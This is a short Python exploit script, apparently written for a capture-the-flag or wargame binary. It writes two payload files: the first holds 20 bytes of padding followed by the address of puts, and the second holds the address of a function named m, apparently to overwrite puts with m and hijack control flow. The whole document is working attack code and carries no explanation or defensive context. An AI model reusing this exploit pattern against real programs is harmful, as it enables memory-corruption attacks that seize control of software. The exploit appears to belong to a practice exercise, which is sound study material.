import struct

fun_address = 0x080484f4 #Addres of function m
address_to_change = 0x08049928 #Addres of puts
offset = 0x10 + 0x04

# Create the payload
payload = b"a" * offset
payload += struct.pack("<I", address_to_change)

payload2 = struct.pack("<I", fun_address)
with open('payload', 'wb') as f:
    f.write(payload)

with open('payload2', 'wb') as g:
    g.write(payload2)
